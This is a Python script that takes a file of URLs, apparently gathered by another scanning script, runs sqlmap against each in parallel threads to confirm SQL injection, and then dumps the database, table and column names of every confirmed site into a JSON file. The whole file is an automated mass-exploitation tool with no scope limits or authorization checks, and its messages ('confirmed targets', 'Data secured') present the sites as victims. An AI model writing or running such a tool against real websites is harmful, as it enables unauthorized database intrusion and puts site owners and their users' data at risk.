import subprocess
import os
import time
import json
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Initializes a lock for thread-safe printing and file writing
print_lock = Lock()

# Function which brings in the results data from another script
def import_results_data(path):
    # Opens the file with read
    with open(path, "r") as f:
        # Brings in the data as a list and strips whitespace
        data = [line.strip() for line in f.readlines() if line.strip()]
    # Returns the data
    return data

# Function to verify a single URL (used by the thread pool)
def verify_single_url(url, verified_urls):
    # Runs sqlmap with --batch to skip prompts and --smart for speed
    result = subprocess.run(["sqlmap", "-u", url, "--batch", "--smart", "--level=1"], capture_output=True, text=True)

    # Uses the lock to prevent overlapping output
    with print_lock:
        # Checks the standard output for is vulnerable
        if "is vulnerable" in result.stdout:
            # Outputs the url is confirmed as vulnerable
            print(f"[+] Confirmed: {url}")
            # Adds the url to the verified urls list safely
            verified_urls.append(url)
        else:
            # Outputs the url was a false positive
            print(f"[-] False Positive: {url}")

# Function to extract the databases
def extract_databases(url):
    # Stores the databases
    databases = []
    # Runs sqlmap as a subprocess to get databases
    database_scan = subprocess.run(["sqlmap", "-u", url, "--dbs", "--batch", "--threads=10"], capture_output=True, text=True)

    # Loops over the split lines of the output
    for line in database_scan.stdout.splitlines():
        # Checks for lines with a database marker
        if "[*]" in line and line != "[*] starting at":
            # Extracts the database name from the end of the line
            database = line.split()[-1]
            # Adds to the databases list
            databases.append(database)
    # Returns the unique databases
    return list(set(databases))

# Function to extract the tables
def extract_tables(url, databases):
    # Stores the database tables mapping
    database_tables = {}
    # Loops over the databases provided
    for database in databases:
        database_tables[database] = []
        # Runs sqlmap to get tables for the specific database
        result = subprocess.run(["sqlmap", "-u", url, "-D", database, "--tables", "--batch", "--threads=10"], capture_output=True, text=True)

        # Loops over the output lines
        for line in result.stdout.splitlines():
            # Checks for table grid borders and ignores header keywords
            if "|" in line and not any(x in line for x in ["Table", "+---", "---"]):
                parts = [p.strip() for p in line.split("|") if p.strip()]
                if parts:
                    # Adds the table name to the correct database key
                    database_tables[database].append(parts[0])
    # Returns the dictionary of databases and tables
    return database_tables

# Function to extract the columns
def extract_columns(url, db_tables_map):
    # Stores the columns data in a nested dictionary
    column_data = {}
    # Loops over each database in the map
    for database, tables in db_tables_map.items():
        column_data[database] = {}
        # Loops over the tables within that database
        for table in tables:
            column_data[database][table] = []
            # Runs sqlmap to get columns for the specific table
            result = subprocess.run(["sqlmap", "-u", url, "-D", database, "-T", table, "--columns", "--batch", "--threads=10"], capture_output=True, text=True)

            # Loops over the output lines
            for line in result.stdout.splitlines():
                # Checks for the column grid and ignores headers
                if "|" in line and not any(x in line for x in ["Column", "+---", "Type"]):
                    parts = [p.strip() for p in line.split("|") if p.strip()]
                    if parts:
                        # Adds the column name to the table list
                        column_data[database][table].append(parts[0])
    # Returns the complete column data
    return column_data

# Function to save findings to a JSON file safely
def save_to_json(url, data):
    filename = "./results.json"
    # Uses the lock to prevent simultaneous file access
    with print_lock:
        # Checks if file exists to load existing data
        if os.path.exists(filename):
            with open(filename, "r") as f:
                try:
                    all_results = json.load(f)
                except json.JSONDecodeError:
                    all_results = {}
        else:
            all_results = {}

        # Adds the new target data to the dictionary
        all_results[url] = data
        
        # Writes the updated data back to the file
        with open(filename, "w") as f:
            json.dump(all_results, f, indent=4)

# Function to process a single verified URL entirely
def process_target(url):
    # Uses the lock to announce the target
    with print_lock:
        # Outputs the current target being processed
        print(f"\n[!] SCANNED TARGET: {url}")

    # Function to extract the databases
    dbs = extract_databases(url)
    # Function to extract the tables
    db_map = extract_tables(url, dbs)
    # Function to extract the columns
    final_data = extract_columns(url, db_map)

    # Uses the lock to print to terminal and save JSON
    with print_lock:
        # Loops through the extracted data to format terminal output
        for db, tables in final_data.items():
            print(f" |-- DB: {db}")
            for table, columns in tables.items():
                print(f" |   |-- [T] {table}: {', '.join(columns)}")
        
        # Saves the data to the JSON file
        save_to_json(url, final_data)
        # Outputs that the target scanning is finished
        print(f"[✓] Data secured for: {url}\n")

# Main executable function
def main():
    # Logs the starting time
    start_time = time.perf_counter() 

    # Asks for the path of the results file
    results_path = input("[+] Please enter the results file path: ").strip()

    # Checks if the input is a file path
    if os.path.isfile(results_path):
        # Outputs that data is being imported
        print("[+] Importing data")
        # Function to bring in the results data
        raw_data = import_results_data(results_path)

        # Outputs that data is being filtered with threads
        print("[+] Filtering data (Threaded)")
        # Stores the filtered verified urls using the threaded function
        verified_urls = []
        with ThreadPoolExecutor(max_workers=10) as filter_exec:
            for url in raw_data:
                filter_exec.submit(verify_single_url, url, verified_urls)

        # Creates a thread pool for full target processing
        print(f"[+] Processing {len(verified_urls)} confirmed targets...")
        with ThreadPoolExecutor(max_workers=5) as executor:
            for url in verified_urls:
                executor.submit(process_target, url)
    else:
        # Outputs that the path provided was invalid
        print("[!] Invalid file path")

    # Gets end time and calculates the elapsed time
    elapsed = time.perf_counter() - start_time
    # Outputs the total time taken
    print(f"\n[✓] Finished in {elapsed:.2f} seconds. Check results.json for full data.")

# Runs the main function
if __name__ == "__main__":
    # Calls the main function
    main()